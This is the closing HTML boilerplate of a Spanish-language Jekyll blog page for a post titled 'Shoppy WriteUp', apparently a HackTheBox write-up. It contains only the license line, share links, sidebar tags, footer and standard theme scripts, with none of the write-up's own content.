      <a href="/tags/writeup/"
          class="post-tag no-text-decoration" >writeup</a>
      
  </div>
  

  <div class="post-tail-bottom
    d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
    <div class="license-wrapper">

      

        

        Esta entrada está licenciada bajo 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         por el autor.

      
    </div>

    <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Compartir</span>
  <span class="share-icons">
    
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Shoppy+WriteUp+-+H4ckerLite&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fshoppy-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Shoppy+WriteUp+-+H4ckerLite&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fshoppy-writeup%2F" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fshoppy-writeup%2F&text=Shoppy+WriteUp+-+H4ckerLite" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i id="copy-link" class="fa-fw fas fa-link small"
        data-toggle="tooltip" data-placement="top"
        title="Copiar enlace"
        data-title-succeed="¡Enlace copiado!">
    </i>

  </span>
</div>


  </div><!-- .post-tail-bottom -->

</div><!-- div.post-tail-wrapper -->


      
    
    

    </div>
  </div> <!-- #core-wrapper -->

  <!-- pannel -->
  <div id="panel-wrapper" class="col-xl-3 pl-2 text-muted">

    <div class="access">
      















  <div id="access-lastmod" class="post">
    <div class="panel-heading">Actualizado recientemente</div>
    <ul class="post-content pl-0 pb-1 ml-1 mt-2">
      
        
        
        
      <li><a href="/posts/shoppy-writeup/">Shoppy WriteUp</a></li>
      
    </ul>
  </div> <!-- #access-lastmod -->



      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    

    </div>
  </div>


    </div>

    
      
      



<!-- BS-toc.js will be loaded at medium priority -->
<script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script>

<div id="toc-wrapper" class="pl-0 pr-4 mb-5">
  <div class="panel-heading pl-3 pt-2 mb-2">Contenido</div>
  <nav id="toc" data-toggle="toc"></nav>
</div>


    
  </div>

</div>

<!-- tail -->

<div class="row">
  <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4">
    
      
      <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    






<!-- Fill with the other newlest posts  -->



  
    
    
  




    
      
      <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <div class="btn btn-outline-primary disabled"
    prompt="Anterior">
    <p>-</p>
  </div>
  

  
  <div class="btn btn-outline-primary disabled"
    prompt="Nuevo">
    <p>-</p>
  </div>
  

</div>

    
      
      <!--  The comments switcher -->


    
  </div>
</div>



        <!-- The Footer -->

<footer class="row pl-3 pr-3">
  <div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0">
    <div class="footer-left">
      <p class="mb-0">
        © 2023
        <a href="https://twitter.com/mortzelo">H4ckerLite</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        

        

        Hecho con 
          <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
         usando el tema 
          <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a>
        .

      </p>
    </div>

  </div>

</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      















  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  <div id="access-tags">
    <div class="panel-heading">Etiquetas populares</div>
    <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

    
      
      <a class="post-tag" href="/tags/hackthebox/">hackthebox</a>
    
      
      <a class="post-tag" href="/tags/writeup/">writeup</a>
    

    </div>
  </div>


    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    
      <div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true"
        data-animation="true" data-autohide="false">
        <div class="toast-header">
          <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close">
            <span aria-hidden="true">&times;</span>
          </button>
        </div>
        <div class="toast-body text-center pt-0">
          <p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p>
          <button type="button" class="btn btn-primary" aria-label="Update">
            Actualizar
          </button>
        </div>
      </div>
    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


    <!--
  JS selector for site.
-->

<!-- layout specified -->


  



  <!-- image lazy-loading & popup & clipboard -->
  

  







  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script>







  

  

  







  
    

    

  



  
    

    

  



  
    

    

  



  
    

    

  




  <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script>








<script defer src="/assets/js/dist/post.min.js"></script>



<!-- commons -->

<script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script>




  </body>

</html>

